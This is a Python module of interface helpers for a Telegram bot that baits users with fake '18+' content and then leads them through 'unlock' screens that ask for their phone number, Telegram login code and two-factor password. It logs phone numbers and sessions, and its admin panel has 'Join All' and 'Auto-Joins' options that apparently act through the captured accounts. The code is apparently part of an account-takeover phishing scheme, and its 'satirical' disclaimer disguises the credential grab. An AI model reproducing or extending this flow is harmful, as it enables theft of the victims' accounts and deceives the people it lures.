from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import config
from localization import get_text

CATEGORY_EMOJIS = {
    "fitness": "🏋️", "business": "💰", "mindset": "🧠",
    "sports": "🏆", "self_improvement": "📈", "funny": "😂", "motivation": "🔥",
}

CATEGORIES = [
    ("fitness", "🏋️ Fitness"), ("business", "💰 Business"),
    ("mindset", "🧠 Mindset"), ("sports", "🏆 Sports"),
    ("funny", "😂 Funny"), ("motivation", "🔥 General"),
]

SPICY_CAPTIONS = {
    "fitness": "💪 <b>BEAST MODE ACTIVATED</b> 💪\n\nThis body is built with <b>HARD WORK</b>, not genetics.\n\n🔥 \"The pain you feel today will be the strength you feel tomorrow.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "business": "💰 <b>MONEY DOESN'T SLEEP</b> 💰\n\nYou're watching this while someone else is GRINDING.\n🔥 \"Your future is created by what you do today, not tomorrow.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "mindset": "🧠 <b>REWIRE YOUR BRAIN</b> 🧠\n\nYou are the average of the 5 people you surround yourself with.\n🔥 \"Become addicted to constant and never-ending self-improvement.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "sports": "🏆 <b>LEGENDS NEVER DIE</b> 🏆\n\n🔥 \"Champions keep playing until they get it right.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "funny": "😂 <b>LAUGH SO HARD</b> 😂\n\n🔥 \"Don't take life too seriously. No one gets out alive anyway.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "motivation": "💦 <b>HARD WORK PAYS OFF</b> 💦\n\n🔥 \"Success is not for the weak. It's for those who GRIND when no one's watching.\" 🔥\n\n⏳ Self-destructs in: <code>{}s</code>",
}

SMART_STYLES = {
    "destructive": {
        "keywords": ["delete", "stop", "cancel", "reject", "remove", "block", "danger", "clear"],
        "style": "danger",
    },
    "constructive": {
        "keywords": ["start", "approve", "accept", "confirm", "verify", "purchase", "unlock", "join", "subscribe"],
        "style": "success",
    },
}


SMALL_CAPS_MAP = {
    'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ',
    'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ',
    'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ',
    'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ',
    'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'х', 'Y': 'ʏ',
    'Z': 'ᴢ',
}


def small_caps(text):
    return "".join(SMALL_CAPS_MAP.get(ch, ch) for ch in text)


def detect_smart_style(text):
    lower = text.lower()
    for kw in SMART_STYLES["destructive"]["keywords"]:
        if kw in lower:
            return "danger"
    for kw in SMART_STYLES["constructive"]["keywords"]:
        if kw in lower:
            return "success"
    return None


def styled_button(text, callback_data=None, style=None, **kwargs):
    return InlineKeyboardButton(small_caps(text), callback_data=callback_data, style=style, **kwargs)


def primary(text, data=None, **kwargs):
    return styled_button(text, data, style="primary", **kwargs)

def success(text, data=None, **kwargs):
    return styled_button(text, data, style="success", **kwargs)

def danger(text, data=None, **kwargs):
    return styled_button(text, data, style="danger", **kwargs)

def warning(text, data=None, **kwargs):
    return styled_button(text, data, style="danger", **kwargs)

def info(text, data=None, **kwargs):
    return styled_button(text, data, style="primary", **kwargs)


def make_keyboard(rows):
    return InlineKeyboardMarkup(rows)


def get_caption_for_category(category, delete_after=60):
    category = category.lower() if category else "motivation"
    template = SPICY_CAPTIONS.get(category, SPICY_CAPTIONS["motivation"])
    return template.format(delete_after)


def fmt_bold(text):
    return f"<b>{text}</b>"

def fmt_italic(text):
    return f"<i>{text}</i>"

def fmt_underline(text):
    return f"<u>{text}</u>"

def fmt_code(text):
    return f"<code>{text}</code>"

def fmt_blockquote(text):
    return f"<blockquote>{text}</blockquote>"


def format_message(title, body, footer=None, stats=None):
    parts = []
    if title:
        parts.append(fmt_blockquote(title))
    parts.append("")
    if isinstance(body, list):
        parts.extend(body)
    else:
        parts.append(body)
    parts.append("")
    if stats:
        parts.append(stats)
    if footer:
        parts.append("")
        parts.append(footer)
    return "\n".join(parts)


def welcome_message(user_id, user_data):
    status = user_data.get("status", "pending").upper() if user_data else "PENDING"
    watched = user_data.get("video_count", 0) if user_data else 0
    return format_message(
        "🔥 WELCOME TO THE SECRET CLUB 🔥",
        [
            "⚠️ <b>18+ CONTENT AHEAD</b> ⚠️",
            "(Proceed only if you're ready for <i>intense pleasure</i>... of success!)",
            "",
            f"You've been granted <b>2 FREE PREVIEWS</b> to see if you can handle the heat.",
            "",
            fmt_bold("📊 Your Stats:"),
            f"• User ID: {fmt_code(str(user_id))}",
            f"• Status: <u>{status}</u>",
            f"• Videos Watched: {fmt_code(str(watched))}",
            "",
            fmt_blockquote("Success is not for the weak. It's for those who GRIND when no one's watching."),
        ],
        fmt_code("🔞 What happens in this bot, stays in this bot.")
    )


def language_selection_keyboard():
    return make_keyboard([
        [primary("English 🇬🇧", "set_lang_en"), primary("Hindi 🇮🇳", "set_lang_hi")]
    ])


def agreement_keyboard(lang="en"):
    return make_keyboard([
        [success(get_text("DISCLAIMER_AGREE", lang), "accept_agreement")],
        [danger(get_text("DISCLAIMER_DECLINE", lang), "reject_agreement")]
    ])


def welcome_keyboard(lang="en"):
    return make_keyboard([
        [primary(get_text("FREE_VIDEO_BTN", lang), "free_video_1"), primary(get_text("FREE_VIDEO_2_BTN", lang), "free_video_2")],
        [success(get_text("UNLOCK_FULL_ACCESS_BTN", lang), "login")],
        [success(get_text("BUY_PREMIUM_BTN", lang), "purchase")],
        [info(get_text("WHAT_IS_THIS_BTN", lang), "reveal_twist"), primary(get_text("CONTACT_OWNER_BTN", lang), "contact_owner")],
        [danger(get_text("DELETE_MY_DATA_BTN", lang), "delete_session")],
    ])


def login_prompt_keyboard(lang="en"):
    return make_keyboard([
        [primary(get_text("SEND_NUMBER_BTN", lang), "login_number")],
        [danger(get_text("CANCEL_BTN", lang), "main_menu")],
    ])


def otp_prompt_keyboard(lang="en"):
    return make_keyboard([
        [success(get_text("VERIFY_OTP_BTN", lang), "verify_otp")],
        [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
        [danger(get_text("CANCEL_BTN", lang), "main_menu")],
    ])


def twofa_prompt_keyboard(lang="en"):
    return make_keyboard([
        [primary(get_text("ENTER_2FA_BTN", lang), "enter_2fa")],
        [warning(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
        [danger(get_text("CANCEL_BTN", lang), "main_menu")],
    ])


def login_success_keyboard(lang="en"):
    return make_keyboard([
        [success(get_text("GIVE_FIX_BTN", lang), "next_video")],
        [info(get_text("MY_STATS_BTN", lang), "stats")],
        [danger(get_text("LOGOUT_BTN", lang), "delete_session")],
    ])


def after_video_keyboard(lang="en"):
    return make_keyboard([
        [success(get_text("ANOTHER_ROUND_BTN", lang), "next_video")],
        [warning(get_text("SKIP_VIDEO_BTN", lang), "skip_video")],
        [info(get_text("NEED_BREAK_BTN", lang), "need_break")],
    ])


def purchase_options_keyboard(lang="en"):
    rows = []
    for pack_key, pack_info in config.PURCHASE_OPTIONS.items():
        rows.append([
            primary(f"🍆 {pack_info['label']} ({pack_info['price']})", f"purchase_{pack_key}")
        ])
    rows.append([info(get_text("BACK_BTN", lang), "next_video")])
    rows.append([danger(get_text("MAIN_MENU_BTN", lang), "main_menu")])
    return make_keyboard(rows)


def contact_owner_keyboard(lang="en"):
    return make_keyboard([
        [success(get_text("DM_OWNER_BTN", lang), "dm_owner")],
        [info(get_text("COPY_USER_ID_BTN", lang), "copy_user_id")],
        [primary(get_text("BACK_BTN", lang), "main_menu")],
    ])


def reveal_keyboard(lang="en"):
    return make_keyboard([
        [primary(get_text("SHARE_BOT_BTN", lang), "share_bot")],
        [info(get_text("SHOW_ME_MORE_BTN", lang), "next_video")],
        [danger(get_text("DELETE_THIS_EVIDENCE_BTN", lang), "delete_session")],
    ])


def force_sub_keyboard(channel_username, invite_link, lang="en"):
    return make_keyboard([
        [primary(get_text("JOIN_CHANNEL_BTN", lang), url=invite_link)],
        [success(get_text("IVE_JOINED_BTN", lang), "check_sub")],
    ])


def main_menu_keyboard(lang="en"):
    return make_keyboard([
        [primary(get_text("GIVE_FIX_BTN", lang), "next_video"), success(get_text("UNLOCK_FULL_ACCESS_BTN", lang), "login")],
        [success(get_text("BUY_PREMIUM_BTN", lang), "purchase")],
        [info(get_text("WHAT_IS_THIS_BTN", lang), "reveal_twist"), info(get_text("MY_STATS_BTN", lang), "stats")],
        [warning(get_text("REPORT_ISSUE_BTN", lang), "report_issue")],
        [danger(get_text("DELETE_SESSION_BTN", lang), "delete_session")],
    ])


def stats_keyboard(lang="en"):
    return make_keyboard([
        [success(get_text("GIVE_FIX_BTN", lang), "next_video")],
        [primary(get_text("BACK_BTN", lang), "main_menu")],
    ])


def admin_keyboard():
    return make_keyboard([
        [info("📊 DASHBOARD", "admin_dashboard")],
        [primary("📹 VIDEO MANAGEMENT", "admin_videos")],
        [success("💰 PURCHASE REQUESTS", "admin_purchases")],
        [warning("📢 BROADCAST", "admin_broadcast")],
        [info("🔒 SUBSCRIPTION", "admin_subscription")],
        [info("👥 USERS", "admin_users")],
        [info("📋 SESSION LOGS", "admin_logs")],
        [danger("⚙️ SETTINGS", "admin_settings")],
    ])


def telegram_admin_panel_keyboard(maintenance_active=False):
    maint_btn = danger("🔴 Disable Maintenance", "adm_toggle_maint") if maintenance_active else success("🟢 Enable Maintenance", "adm_toggle_maint")
    return make_keyboard([
        [danger("📅 Sub Plans", "adm_sub_plans"), danger("🔗 Set Force Join", "adm_force_join")],
        [primary("📁 Set Log Group", "adm_log_group"), primary("🏷️ Set Branding Name", "adm_brand_name")],
        [success("⏰ Set Branding Days", "adm_brand_days"), success("🖼️ Set Menu Images", "adm_menu_images")],
        [danger("🏦 Set UPI ID", "adm_upi"), danger("🪙 Set USDT", "adm_usdt"), danger("💎 Set TON", "adm_ton")],
        [primary("👥 Join All", "adm_join_all"), primary("🔗 Auto-Joins", "adm_auto_joins"), primary("👤 User Manage", "adm_user_manage")],
        [success("📊 Set Commission", "adm_commission"), maint_btn],
        [danger("👥 Manage Admins", "adm_admins"), danger("🔙 Back to Menu", "main_menu")]
    ])


def get_purchase_request_message():
    return (
        "<blockquote>💰 WANT MORE EXCLUSIVE CONTENT?</blockquote>\n\n"
        "You've reached the end of the free queue.\n"
        "But don't worry... we have MORE.\n\n"
        f"<b>📦 PURCHASE OPTIONS:</b>\n"
        + "\n".join(f"• {v['label']}: <b>{v['price']}</b>" for v in config.PURCHASE_OPTIONS.values()) +
        "\n\nAll content is 🔥 <b>LIFE-CHANGING MOTIVATION</b> 🔥"
    )


def get_disclaimer():
    return (
        "<blockquote>⚠️ LEGAL DISCLAIMER</blockquote>\n\n"
        "This bot uses an <b>18+ marketing theme</b> for ENTERTAINMENT and\n"
        "VIRAL MARKETING purposes <b>ONLY</b>.\n\n"
        "✅ ALL CONTENT is 100% LEGAL motivational/self-improvement videos.\n"
        "✅ NO actual adult content is ever distributed.\n"
        "✅ The theme is <b>SATIRICAL</b> and meant to attract attention.\n\n"
        "<i>By using this bot, you agree that you understand the satirical nature\n"
        "of the marketing.</i>"
    )


def log_session(user_id, username, phone, action, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = (
        f"[{timestamp}] 👤 @{username or 'unknown'} (ID: {user_id}) "
        f"📱 {phone or 'N/A'} "
        f"▶️ {action} "
        f"📌 {details}\n"
    )
    with open(config.SESSIONS_LOG, "a", encoding="utf-8") as f:
        f.write(entry)


def build_detailed_log(user_data, user_id, username):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S %Z")
    return f"""
╔{'═'*60}╗
║ 🔞 VIP SESSION REPORT #{user_id % 100000:05d} {' ' * 31}║
╠{'═'*60}╣
║ 👤 User ID: {str(user_id):<49}║
║ 🆔 Username: @{username or 'N/A':<42}║
║ 📛 First Name: {(user_data.get('first_name') or 'N/A'):<40}║
║ 📱 Phone: {(user_data.get('phone') or 'Not provided'):<39}║
║ 🔑 Status: {str(user_data.get('status', 'pending')).upper():<45}║
║ {'─'*60}║
║ ⏰ Last Activity: {timestamp:<38}║
║ 📹 Videos Watched: {str(user_data.get('video_count', 0)) + '/50':<40}║
║ ⏱️ Watch Time: {str(user_data.get('total_watch_time', 0) // 60):<5} min{' ' * 41}║
║ 👥 Referrals: {str(user_data.get('referral_count', 0)):<44}║
║ {'─'*60}║
║ 💰 Pack: {(user_data.get('purchased_pack') or 'None'):<48}║
║ ✅ Status: {'ACTIVE & ADDICTED' if user_data.get('status') == 'purchased' else 'WAITING' :<37}║
╚{'═'*60}╝
"""
